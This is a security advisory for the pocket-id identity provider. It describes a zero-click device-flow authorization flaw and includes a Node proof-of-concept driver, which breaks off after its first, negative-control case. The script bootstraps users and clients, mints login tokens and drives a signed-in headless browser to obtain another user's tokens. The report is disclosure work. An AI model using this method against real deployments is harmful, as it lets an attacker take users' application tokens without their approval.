# Summary

The page that finishes a device sign-in accepts the device's code in the address itself. When a signed-in user opens such a link, the authorization completes during the page load: the code is never presented for confirmation, the user is never asked whether it matches what the device is showing, and there is no approve or deny step. Whoever composed the link then collects the tokens by polling, as the protocol intends the real device to.

This happens in two situations, and between them they cover the ordinary case:

- the sign-in is for an application the user has approved before, even once, at any time in the past;
- the sign-in is for an application configured to skip the consent screen, **including one the user has never encountered**.

We verified both against the published release image, driving a real headless browser with a real signed-in session. The page really does render, and it really does complete the flow with nothing clicked.

Putting the code in the link is a legitimate optimisation, and RFC 8628 defines it. What the specification also says, in the same section, is that the optimisation removes only the typing: "the user interaction described in Section 3.3 is still followed, with the optimization that the user does not need to type in the 'user_code'. The server SHOULD display the 'user_code' to the user and ask them to verify that it matches the 'user_code' being displayed on the device to confirm they are authorizing the correct device. As before, in addition to taking steps to confirm the identity of the device, the user should also be afforded the choice to approve or deny the authorization request." Its security considerations, on this exact optimisation, add: "it is particularly important to confirm that the device is in the user's possession, as the user no longer has to type in the code being displayed on the device manually." Both of those steps -- the code-matching check and the approve/deny choice -- are the defence against someone else's device being authorized by a user who was simply sent a link. On the paths described here, neither runs.

# Affected Component and Versions

Affected component:

- Docker image: `ghcr.io/pocket-id/pocket-id`
- OIDC device-authorization endpoint and the device verification page
- Related source files: `frontend/src/routes/device/+page.svelte`, `frontend/src/routes/device/+page.ts`, `backend/internal/oidc/device_service.go`, `backend/internal/oidc/authorization_service.go`, `backend/internal/oidc/module.go`

The behavior was reviewed at:

- release tag `v2.13.0` (repository commit `f39f59e9e0dcf0957c83872e60093cebb90ca596`)
- published image `ghcr.io/pocket-id/pocket-id:v2.13.0`

Direct static review on 2026-08-17 confirmed that the same relevant behavior remains on the current default branch at commit `22354581` (approximately 25 commits after `v2.13.0`); where line references differ from `v2.13.0` the behaviour is unchanged, and the run is the authority.

We re-ran the reproduction end to end on 2026-08-18 against the published image `ghcr.io/pocket-id/pocket-id:v2.13.0`, driven by the file at `review/shared/repro-plans-20260818/pocket-id-pocket-id-poc.mjs`. Every oracle passed and the run reported `RESULT: REPRODUCED` with exit status 0. The transcript is preserved at `review/pocket-id-pocket-id/pocket-id-e2e-transcript-20260818.txt`. So this is not stale against something already fixed on `main`.

`v2.13.0` is the current release at the time of writing, and the current default branch carries the same behaviour. No patched version was identified.

# Security Boundary and Preconditions

The practical scenario requires:

1. the ability to make one device-authorization request against the deployment -- authenticating as a client at `POST /api/oidc/device/authorize`; for a public client that is the client identifier alone, an operator-chosen and often human-readable string that any signed-in user of the deployment can list for themselves; for a confidential client it is the secret as well (our run used the harder case and supplied a confidential client's secret both when starting the request and when polling);
2. one signed-in user of the deployment who opens the link the device-flow response hands out;
3. for case 2 of the finding, that the same signed-in user has approved the same application at least once before, at any time in the past; case 3 has no such requirement.

Not required: an account of the victim's, credentials of the victim's, interaction with the victim beyond opening one link, or a privileged network position. On a deployment with any public client, the first precondition is available to an ordinary user of that deployment, against any other user.

**Why the "attacker is already a client" objection does not hold.** Since the attacker must authenticate as a client, one reading is that they are simply a client obtaining tokens it was always entitled to obtain. The difference is where the tokens end up. In the browser flow, a user's prior consent is safe to reuse without asking again because the resulting code is returned to an address the client registered in advance -- consent and delivery are bound together, and an attacker who tricks a user into opening a link cannot make the code arrive anywhere else. The device flow has no such binding: delivery is by polling, so whoever started the request collects the result, and nothing ties that party to a destination the operator approved. Reusing prior consent therefore means something different here than it does there: it is not "return this to the place we already agreed on", it is "hand this to whoever asked, because you once agreed to this application". That is why prior consent is the wrong question on this flow, and why the code-matching step the specification asks for is the one that would have answered the right one -- is the device now asking the device in front of you.

Bounding it honestly: this is not administrative access to the product, and the tokens are scoped to one application. This report does not test a deployment behind an external proxy, nor any configuration other than the defaults plus the applications the run creates.

# Technical Details

The device verification page reads the code from the URL and, when a signed-in user opens it, calls the server to decide whether authorization is required. When the server answers "not required", the page proceeds directly to the verify step with no confirmation UI:

- `frontend/src/routes/device/+page.ts:4` -- `data.code = url.searchParams.get('user_code')`
- `frontend/src/routes/device/+page.svelte:53-57` -- `onMount` -> `authorize()` when `data.code && $userStore`
- `frontend/src/routes/device/+page.svelte:76-92` -- `authorizationRequired === false` -> straight to `verifyDeviceCode`

The server-side decision is `authorizationRequired = consentRequired(hasAuthorizedClient, client.SkipConsent, nil)`, and `consentRequired = !hasAlreadyAuthorizedClient && !clientSkipsConsent`:

- `backend/internal/oidc/device_service.go`
- `backend/internal/oidc/authorization_service.go:76-81`

The routes involved are:

- `POST /api/oidc/device/authorize` (unauthenticated)
- `POST /api/oidc/device/verify` (browser-authenticated -- the exact request the Authorize button issues)
- `GET  /api/oidc/device/info` (browser-authenticated)

See `backend/internal/oidc/module.go:163-165`.

The result is two independent paths on which a single navigation to `/device?user_code=<code>` completes authorization without any user click:

- **prior-consent path** -- `hasAlreadyAuthorizedClient` is true because the victim has approved that application before, at any time. `consentRequired` therefore returns false, and the page proceeds to `verifyDeviceCode` on load.
- **skip-consent path** -- `client.SkipConsent` is true. `consentRequired` returns false regardless of whether the victim has ever seen the application. The page proceeds to `verifyDeviceCode` on load, on first-ever contact with the client.

The re-authentication branch is the only setting we observed that halts the identical page load on the OIDC device-flow path.

**On the code itself.** On the paths that authorize, the code is never presented for confirmation. It does appear, pre-filled, in the entry field it arrived in -- the field is bound to the query parameter and rendered while the page works -- and the DOM captured at the end of the navigation contains no occurrence of it. What never happens on this path is being shown the code and asked whether it matches the device in front of the user.

**The closest precedent already in the codebase.** The same `/device` page already renders, for the separately-prefixed device-login flow handled by that service, the code as `XXXX - XXXX` alongside the device, the IP address and an approximate location, with explicit Deny and Approve buttons. That is exactly the confirmation the specification asks for, built, styled and shipping. It is simply not applied to the OIDC device-flow branches. On those branches the code appears only where it is echoed back into the field it arrived in; none of the branches that actually decide the authorization display it, and none asks whether it matches the device in front of the user.

Specification text quoted above: RFC 8628, sections 3.3.1 and 5.

# Impact

If the preconditions hold, an actor who can make one device-authorization request against the deployment obtains, on a single page load from any signed-in user of the deployment who opens the resulting link, access tokens and an identity token for that user on the application in question, with whatever scopes that application is configured for. We confirmed the identity by calling the user-information endpoint with the token and comparing the subject to the victim's account identifier.

Between the two paths, the second is the worse one. The first case needs the user to have approved that application before -- an ordinary state for any application they actually use, so not much of a barrier, but it is a state. The second needs nothing: an application configured to skip consent authorizes on page load for a user who has **never interacted with it at all**, with no consent record in the database. The reproduction checks for the absence of that record before running it, and the server itself reports that no authorization is required.

The report does not claim:

- administrative access to the product;
- code execution, integrity loss, or availability loss in pocket-id;
- takeover of accounts beyond the single application in question;
- reach against deployments behind an external proxy or with configuration other than the defaults plus the applications the run creates;
- a measurement of whether an ordinary user would notice the page -- the claim is about what the page does, not about what a user perceives.

Suggested classification:

- CWE-862: Missing Authorization
- CWE-451: User Interface (UI) Misrepresentation of Critical Information
- CVSS 4.0: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N`
- Score: 7.6 (High)

The CVSS vector reflects the two preconditions in this flow: `PR:N` because the attacker's device-authorization request needs only client authentication, not a deployment account; `UI:P` because one signed-in user of the deployment must open one link; `AT:P` because the attacker needs to compose that link. `SC:L` / `SI:L` reflect the demonstrated subsequent-system impact: the reproduction shows the userinfo endpoint returning the victim's `sub`, `email`, and `preferred_username` under the issued token, an evidence-based confidentiality effect on the impersonated application account.

# PoC

## Evidence type and limitation

The following is an end-to-end reproduction against the unmodified published release image, driving a real headless browser with a real signed-in victim session. The browser holds the victim's session in its own profile, obtained through the product's normal sign-in path, and the page loads are genuine navigations. Nothing about the product is stubbed or reimplemented. Nothing is reconfigured beyond creating the applications and the user that any deployment has.

The driver never issues the approval request in the cases under test. In cases 2, 3 and 4 the only thing that touches `/device` is one headless-chromium navigation run with `--dump-dom`: no `--remote-debugging-port`, no CDP session, and no input injection of any kind.

We did not test a deployment behind an external proxy, nor any configuration other than the defaults plus the applications the run creates. We did not measure whether an ordinary user would notice the page.

## Prerequisites

- Docker
- Node 18 (no npm packages required)
- the published pocket-id image and a headless Chromium image (both pulled by the run)

Bring up the target from the published release image:

```
docker run -d --name pocket-id-repro -p 127.0.0.1:1411:1411 \
  -e APP_URL=http://localhost:1411 \
  -e ENCRYPTION_KEY=repro-encryption-key-32-bytes-min \
  -e ANALYTICS_DISABLED=true -e VERSION_CHECK_DISABLED=true \
  -v "$PWD/data":/app/data \
  ghcr.io/pocket-id/pocket-id:v2.13.0
```

Trigger boundary: one caller who can make a device-authorization request against the deployment (client authentication at `POST /api/oidc/device/authorize`), plus one signed-in user who opens the link the device-flow response hands out.

**One practical note that cost us two runs and would cost you the same.** The browser stage uses a virtual clock so it does not wait in real time. If that budget is too small, the page's own scripts never finish loading, the page makes no requests at all, and the run reports that nothing happened -- which is indistinguishable from the product correctly refusing. We calibrated it against the server's own request log: below the value in the program, the sign-in page does not even issue its exchange request. If a re-run appears to show nothing happening, check that first.

## Test file

Save as `poc.mjs`. Single file, Node 18, no dependencies. Docker is used for the target and for the headless browser.

```javascript
#!/usr/bin/env node
// pocket-id/pocket-id -- OIDC device-flow zero-click authorization
// Repro driver. Node 18, zero npm dependencies. Target + browser run in Docker.
//
// Verified against pocket-id v2.13.0, tag f39f59e9e0dcf0957c83872e60093cebb90ca596 - the image this run uses.
// Line references were read at main 22354581 (2026-08-17, ~25 commits later); where they
// differ from v2.13.0 the behaviour is unchanged, and the run is the authority:
//   frontend/src/routes/device/+page.svelte:53-57   onMount -> authorize() when data.code && $userStore
//   frontend/src/routes/device/+page.ts:4           data.code = url.searchParams.get('user_code')
//   frontend/src/routes/device/+page.svelte:76-92   authorizationRequired === false -> straight to verifyDeviceCode
//   backend/internal/oidc/device_service.go         authorizationRequired = consentRequired(hasAuthorizedClient, client.SkipConsent, nil)
//   backend/internal/oidc/authorization_service.go:76-81  consentRequired = !hasAlreadyAuthorizedClient && !clientSkipsConsent
//   backend/internal/oidc/module.go:163-165         POST /api/oidc/device/authorize (unauthenticated)
//                                                   POST /api/oidc/device/verify  (browserAuth)
//                                                   GET  /api/oidc/device/info    (browserAuth)
//
// The driver never issues the approval request in the cases under test. In cases
// 2, 3 and 4 the only thing that touches /device is one headless-chromium
// navigation run with --dump-dom: no --remote-debugging-port, no CDP session,
// no input injection of any kind.

import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFileSync } from 'node:child_process';

const HOST = process.env.PID_HOST || 'localhost';
const PORT = parseInt(process.env.PID_PORT || '1411', 10);
const ORIGIN = `http://${HOST}:${PORT}`;
const CHROME_IMAGE = process.env.CHROME_IMAGE || 'zenika/alpine-chrome:latest';
const WORKDIR = process.env.WORKDIR || path.join(os.homedir(), 'repro-a');
const DOMDIR = path.join(WORKDIR, 'dom');
const PROFILE = path.join(WORKDIR, 'chrome-profile');
const SCOPE = 'openid profile email';
const DEVICE_GRANT = 'urn:ietf:params:oauth:grant-type:device_code';

const oracles = [];
let failures = 0;

const log = (...a) => console.log(...a);
const hr = (t) => log('\n' + '='.repeat(78) + '\n' + t + '\n' + '='.repeat(78));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function request(method, urlPath, opts = {}) {
  const { json, form, jwt, headers = {} } = opts;
  let body = null;
  const h = { Accept: 'application/json', ...headers };
  if (json !== undefined) { body = JSON.stringify(json); h['Content-Type'] = 'application/json'; }
  if (form !== undefined) { body = new URLSearchParams(form).toString(); h['Content-Type'] = 'application/x-www-form-urlencoded'; }
  if (jwt) h['Authorization'] = 'Bearer ' + jwt;
  if (body !== null) h['Content-Length'] = Buffer.byteLength(body);
  return new Promise((resolve, reject) => {
    const req = http.request({ host: HOST, port: PORT, path: urlPath, method, headers: h }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const text = Buffer.concat(chunks).toString('utf8');
        let parsed = null;
        try { parsed = JSON.parse(text); } catch { /* not json */ }
        resolve({ status: res.statusCode, headers: res.headers, text, json: parsed });
      });
    });
    req.on('error', reject);
    if (body !== null) req.write(body);
    req.end();
  });
}

function accessTokenFromSetCookie(res) {
  for (const c of res.headers['set-cookie'] || []) {
    const m = /^access_token=([^;]+)/.exec(c);
    if (m) return decodeURIComponent(m[1]);
  }
  return null;
}

function die(msg) {
  console.error('\nSETUP FAILURE (this is not a result about the finding): ' + msg);
  process.exit(2);
}
// ORACLE: counts towards pass/fail.
function check(name, ok, detail) {
  oracles.push({ name, ok });
  if (!ok) failures++;
  log(`  [${ok ? 'PASS' : 'FAIL'}] ${name}${detail ? '  -- ' + detail : ''}`);
}
// Observation: recorded in the transcript, does not decide the outcome.
function note(name, ok, detail) {
  log(`  [note ${ok ? 'yes' : 'no '}] ${name}${detail ? '  -- ' + detail : ''}`);
}

// ---------------------------------------------------------------- browser ---
function chromeVisit(url, label) {
  fs.mkdirSync(DOMDIR, { recursive: true });
  fs.mkdirSync(PROFILE, { recursive: true });
  try { fs.chmodSync(PROFILE, 0o777); } catch { /* best effort */ }
  const args = [
    'run', '--rm', '--network', 'host',
    '-v', `${PROFILE}:/data`,
    CHROME_IMAGE,
    '--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage',
    '--no-first-run', '--no-default-browser-check', '--disable-background-networking',
    '--user-data-dir=/data/profile',
    // This budget is load-bearing and was calibrated, not guessed. Virtual time
    // advances faster than the SvelteKit bundles download, so too small a budget
    // expires mid-load and --dump-dom captures an un-hydrated shell that has made
    // no API calls at all. That looks exactly like "the page chose to do nothing",
    // i.e. a false negative on the very behaviour under test.
    // Measured against this stack, watching the server's own request log:
    //   budget  5000 / 20000 -> login page dumps  9352 bytes, no interactive elements
    //   budget 60000         -> login page dumps 12158 bytes, buttons present,
    //                           but /lc/<code> still issues NO exchange request
    //   budget 180000        -> /lc/<code> dumps 14432 bytes and the server logs
    //                           the exchange request
    // 180000 is therefore the first value at which the page under test actually
    // runs. Anything lower silently under-reports.
    '--virtual-time-budget=180000',
    '--dump-dom', url,
  ];
  log(`  browser> docker ${args.join(' ')}`);
  let dom = '';
  try {
    dom = execFileSync('docker', args, { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024, stdio: ['ignore', 'pipe', 'inherit'] });
  } catch (e) {
    dom = (e.stdout || '').toString();
    log(`  browser> chromium exited non-zero (status ${e.status}); captured ${dom.length} bytes of DOM`);
  }
  const f = path.join(DOMDIR, `${label}.html`);
  fs.writeFileSync(f, dom);
  log(`  browser> ${dom.length} bytes of DOM saved to ${f}`);
  return dom;
}

// ------------------------------------------------------------ device flow ---
async function deviceAuthorize(client) {
  const res = await request('POST', '/api/oidc/device/authorize', {
    form: { client_id: client.id, client_secret: client.secret, scope: SCOPE },
  });
  if (res.status !== 200 || !res.json?.user_code) die(`device/authorize -> ${res.status} ${res.text}`);
  return res.json; // device_code, user_code, verification_uri, verification_uri_complete, expires_in, interval
}

// fosite rate-limits device polling (DeviceAuthTokenPollingInterval = 5s,
// backend/internal/oidc/provider.go:40) and answers slow_down; treated as pending.
async function pollToken(client, deviceCode, { attempts = 3, gapMs = 6000 } = {}) {
  let last = null;
  for (let i = 0; i < attempts; i++) {
    if (i > 0) await sleep(gapMs);
    const res = await request('POST', '/api/oidc/token', {
      form: { grant_type: DEVICE_GRANT, device_code: deviceCode, client_id: client.id, client_secret: client.secret },
    });
    last = res;
    if (res.status === 200 && res.json?.access_token) { log(`  poll ${i + 1}/${attempts}: TOKEN ISSUED`); return { granted: true, res }; }
    const err = res.json?.error || `http_${res.status}`;
    log(`  poll ${i + 1}/${attempts}: ${err}`);
    if (err !== 'authorization_pending' && err !== 'slow_down') return { granted: false, res, error: err };
  }
  return { granted: false, res: last, error: last?.json?.error || 'authorization_pending' };
}

async function deviceInfo(userCode, victimJwt) {
  const res = await request('GET', `/api/oidc/device/info?code=${encodeURIComponent(userCode)}`, { jwt: victimJwt });
  if (res.status !== 200) die(`device/info -> ${res.status} ${res.text}`);
  return res.json;
}

// --------------------------------------------------------------- fixtures ---
async function createClient(adminJwt, name, extra) {
  const res = await request('POST', '/api/oidc/clients', {
    jwt: adminJwt,
    json: {
      name,
      callbackURLs: ['http://localhost:9999/callback'],
      logoutCallbackURLs: [],
      isPublic: false, pkceEnabled: false,
      requiresReauthentication: false, requiresPushedAuthorizationRequests: false,
      skipConsent: false, isGroupRestricted: false,
      credentials: { federatedIdentities: [] },
      ...extra,
    },
  });
  if (res.status !== 201) die(`create client "${name}" -> ${res.status} ${res.text}`);
  const id = res.json.id;
  // Route is POST /api/oidc/clients/{id}/secret (singular), returning 200 with
  // {"secret": "..."} - oidc_controller.go:37 and :262. The body is optional and
  // the server generates the secret, so we take the one it returns rather than
  // supplying our own; that keeps this independent of the request DTO's shape.
  const s = await request('POST', `/api/oidc/clients/${id}/secret`, { jwt: adminJwt, json: {} });
  if (s.status !== 200 || !s.json || !s.json.secret) {
    die(`create secret for "${name}" -> ${s.status} ${s.text}`);
  }
  const secret = s.json.secret;
  log(`  client "${name}" id=${id}`);
  return { id, secret, name };
}

async function mintOneTimeToken(adminJwt, userId) {
  // ttl > 15m yields a 16-character token (onetimeaccess/service.go:266-270);
  // /api/one-time-access-token/<t> rejects any length other than 6 or 16 (handler.go:145).
  const res = await request('POST', `/api/users/${userId}/one-time-access-token`, { jwt: adminJwt, json: { ttl: '1h' } });
  if (res.status !== 201) die(`one-time-access-token -> ${res.status} ${res.text}`);
  return res.json.token;
}

// ------------------------------------------------------------------- main ---
(async () => {
  hr('0. Preconditions');
  for (let i = 0; ; i++) {
    const h = await request('GET', '/healthz').catch(() => null);
    if (h && h.status === 204) break;
    if (i > 60) die(`${ORIGIN}/healthz never returned 204 -- is the container up?`);
    await sleep(1000);
  }
  log(`  ${ORIGIN} is up`);
  const setupAvail = await request('GET', '/api/signup/setup');
  if (setupAvail.status !== 204) {
    die(`this instance is already configured (GET /api/signup/setup -> ${setupAvail.status}). ` +
        'Recreate the container with an empty data directory so the run starts from a known state.');
  }
  log('  instance is unconfigured (GET /api/signup/setup -> 204)');

  hr('1. Bootstrap: initial admin, victim user, three OIDC clients');
  const admin = await request('POST', '/api/signup/setup', {
    json: { username: 'reproadmin', email: 'admin@repro.test', firstName: 'Repro', lastName: 'Admin' },
  });
  if (admin.status !== 200) die(`signup/setup -> ${admin.status} ${admin.text}`);
  const adminJwt = accessTokenFromSetCookie(admin);
  if (!adminJwt) die('signup/setup returned no access_token cookie');
  log('  admin created, admin session token captured');

  const victimRes = await request('POST', '/api/users', {
    jwt: adminJwt,
    json: { username: 'victim', email: 'victim@repro.test', firstName: 'Vic', lastName: 'Tim', isAdmin: false },
  });
  if (victimRes.status !== 201) die(`create victim -> ${victimRes.status} ${victimRes.text}`);
  const victimId = victimRes.json.id;
  log(`  victim user id=${victimId} (non-admin)`);

  const clientA = await createClient(adminJwt, 'Repro Client A');
  const clientB = await createClient(adminJwt, 'Repro Client B', { skipConsent: true });
  const clientC = await createClient(adminJwt, 'Repro Client C', { skipConsent: true, requiresReauthentication: true });

  const victimExchange = await request('POST', `/api/one-time-access-token/${await mintOneTimeToken(adminJwt, victimId)}`);
  if (victimExchange.status !== 200) die(`exchange one-time token -> ${victimExchange.status} ${victimExchange.text}`);
  const victimJwt = accessTokenFromSetCookie(victimExchange);
  if (!victimJwt) die('one-time token exchange returned no access_token cookie');
  log('  victim API session token captured (driver-side; used only for read-only checks and one deliberate approval)');

  hr('2. Give the headless browser its own signed-in victim session');
  await sleep(11000); // one-time-access-token exchange limiter: 1/10s, burst 5 (middleware/rate_limit.go:55)
  const browserCode = await mintOneTimeToken(adminJwt, victimId);
  chromeVisit(`${ORIGIN}/lc/${browserCode}`, '00-browser-login');
  const meDom = chromeVisit(`${ORIGIN}/api/users/me`, '01-browser-session-check');
  if (!meDom.includes('victim@repro.test')) {
    die('the chromium profile does not hold a victim session after /lc/<code>. Cookie persistence ' +
        'across chromium runs failed, so nothing below would mean anything. See ' +
        path.join(DOMDIR, '01-browser-session-check.html'));
  }
  log('  browser profile is signed in as the victim (verified by dumping /api/users/me from that profile)');

  // ---------------------------------------------------------------- case 1 --
  hr('3. CASE 1 (negative control): client with no prior consent and skipConsent off');
  const d1 = await deviceAuthorize(clientA);
  log(`  user_code=${d1.user_code}  verification_uri_complete=${d1.verification_uri_complete}`);
  const i1 = await deviceInfo(d1.user_code, victimJwt);
  check('case1: server reports authorizationRequired=true', i1.authorizationRequired === true, `authorizationRequired=${i1.authorizationRequired}`);
  const pre1 = await pollToken(clientA, d1.device_code, { attempts: 1 });
  check('case1: baseline -- no token before the page is opened', !pre1.granted, pre1.error);
  const dom1 = chromeVisit(`${ORIGIN}/device?user_code=${d1.user_code}`, '10-case1-device');
  note('case1: consent card rendered', /wants to access the following information/i.test(dom1));
  note('case1: an Authorize button is present', />\s*Authorize\s*</.test(dom1));
  note('case1: success message absent', !dom1.includes('The device has been authorized.'));
